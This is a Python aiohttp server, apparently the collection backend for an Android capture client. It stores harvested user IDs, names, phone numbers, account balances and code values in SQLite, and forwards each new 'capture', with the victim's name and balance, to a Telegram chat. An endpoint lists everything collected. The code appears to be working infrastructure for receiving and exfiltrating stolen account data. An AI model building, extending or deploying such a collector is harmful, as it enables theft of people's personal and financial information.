#!/usr/bin/env python3
"""
KNT Capture Server -- receives UID captures from the android client
"""

import os
import sqlite3
import time
from collections import deque
from typing import Dict

from aiohttp import web

# ---- CONFIG -----------------------------------------------------------------

# change this to your own secret
INGEST_TOKEN = "knt-capture-CHANGE-THIS-9f2b7c3d4e"

# telegram admin notifications (optional)
# বানাতে চাইলে ভরবি, না হলে খালি রাখ
TELEGRAM_BOT_TOKEN = ""       # example: "123456:ABC..."
TELEGRAM_CHAT_ID = ""         # example: "7884194046"

DB = "captures.db"
MAX_PER_REQUEST = 500         # safety


# ---- DB ---------------------------------------------------------------------

def init_db():
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.executescript("""
    CREATE TABLE IF NOT EXISTS captures (
        id           INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id    TEXT,
        uid          TEXT,
        user_name    TEXT,
        nick_name    TEXT,
        phone        TEXT,
        balance      TEXT,
        amount_code  TEXT,
        host         TEXT,
        source_url   TEXT,
        raw          TEXT,
        captured_at  INTEGER,
        received_at  TEXT DEFAULT CURRENT_TIMESTAMP,
        UNIQUE(device_id, uid)
    );
    CREATE INDEX IF NOT EXISTS idx_uid ON captures(uid);
    CREATE INDEX IF NOT EXISTS idx_device ON captures(device_id);
    """)
    conn.commit()
    conn.close()


def save_capture(item: dict):
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    try:
        c.execute("""
        INSERT OR IGNORE INTO captures
        (device_id, uid, user_name, nick_name, phone, balance,
         amount_code, host, source_url, raw, captured_at)
        VALUES (?,?,?,?,?,?,?,?,?,?,?)
        """, (
            item.get("device_id", ""),
            item.get("uid", ""),
            item.get("userName", ""),
            item.get("nickName", ""),
            item.get("phone", ""),
            item.get("balance", ""),
            item.get("amountOfCode", ""),
            item.get("host", ""),
            item.get("sourceUrl", ""),
            item.get("raw", ""),
            item.get("updatedAt", int(time.time() * 1000)),
        ))
        conn.commit()
        return c.rowcount > 0
    except Exception:
        return False
    finally:
        conn.close()


# ---- TELEGRAM NOTIFY --------------------------------------------------------

async def notify_telegram(text: str):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    try:
        import aiohttp
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        async with aiohttp.ClientSession() as s:
            await s.post(url, json={
                "chat_id": TELEGRAM_CHAT_ID,
                "text": text,
                "parse_mode": "HTML",
                "disable_web_page_preview": True,
            }, timeout=aiohttp.ClientTimeout(total=8))
    except Exception:
        pass


# ---- ROUTES -----------------------------------------------------------------

async def handle_root(req):
    return web.Response(text="KNT Capture Server is running.", content_type="text/plain")


async def handle_health(req):
    conn = sqlite3.connect(DB)
    n = conn.execute("SELECT COUNT(*) FROM captures").fetchone()[0]
    conn.close()
    return web.json_response({"ok": True, "captures": n})


async def handle_ingest(req):
    # auth
    auth = req.headers.get("X-Ingest-Token", "")
    if auth != INGEST_TOKEN:
        return web.json_response({"ok": False, "err": "unauthorized"}, status=401)

    try:
        data = await req.json()
    except Exception:
        return web.json_response({"ok": False, "err": "bad json"}, status=400)

    # data can be a list or {"items": [...]}
    items = []
    if isinstance(data, list):
        items = data
    elif isinstance(data, dict):
        items = data.get("items") or data.get("captures") or []
    if not isinstance(items, list):
        return web.json_response({"ok": False, "err": "bad format"}, status=400)

    items = items[:MAX_PER_REQUEST]

    saved = 0
    for it in items:
        if not isinstance(it, dict):
            continue
        if save_capture(it):
            saved += 1
            # notify on new capture
            uid = it.get("uid", "?")
            uname = it.get("userName", "?")
            bal = it.get("balance", "?")
            dev = it.get("device_id", "?")
            asyncio.create_task(notify_telegram(
                f"🎯 <b>New Capture</b>\n\n"
                f"🆔 UID: <code>{uid}</code>\n"
                f"👤 User: <b>{uname}</b>\n"
                f"💎 Balance: <b>{bal}</b>\n"
                f"📱 Device: <code>{dev}</code>"
            ))

    return web.json_response({"ok": True, "received": len(items), "saved": saved})


async def handle_list(req):
    # simple protected list
    auth = req.query.get("token", "")
    if auth != INGEST_TOKEN:
        return web.json_response({"ok": False, "err": "unauthorized"}, status=401)

    conn = sqlite3.connect(DB)
    conn.row_factory = sqlite3.Row
    limit = int(req.query.get("limit", 200))
    rows = conn.execute(
        "SELECT * FROM captures ORDER BY id DESC LIMIT ?", (limit,)
    ).fetchall()
    conn.close()
    return web.json_response({"ok": True, "count": len(rows),
                              "items": [dict(r) for r in rows]})


# ---- MAIN -------------------------------------------------------------------

import asyncio

def make_app():
    app = web.Application()
    app.router.add_get("/", handle_root)
    app.router.add_get("/health", handle_health)
    app.router.add_post("/api/public/captures-ingest", handle_ingest)
    app.router.add_get("/api/public/captures-list", handle_list)
    return app


if __name__ == "__main__":
    init_db()
    port = int(os.environ.get("PORT", 8080))
    print(f"[knt] capture server on :{port}")
    web.run_app(make_app(), host="0.0.0.0", port=port)
